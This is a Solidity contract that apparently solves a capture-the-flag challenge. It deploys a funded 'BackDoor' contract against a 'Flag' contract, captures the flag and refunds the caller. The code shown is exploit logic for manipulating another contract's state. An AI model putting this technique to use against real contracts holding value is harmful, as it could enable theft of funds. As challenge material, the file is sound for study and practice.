pragma solidity ^0.4.15;

import "./Flag.sol";
import "./BackDoor.sol";

contract Capturer {
    function Capturer() public {
    }

    function capture(Flag flag, bytes32 braggingRights) public payable {
        uint beforeBalance = this.balance;
        (new BackDoor).value(msg.value)(flag);
        flag.capture(braggingRights);
        assert(flag.captured(this));
        assert(beforeBalance == this.balance);
        msg.sender.transfer(msg.value);
    }

    function() public payable {}
}
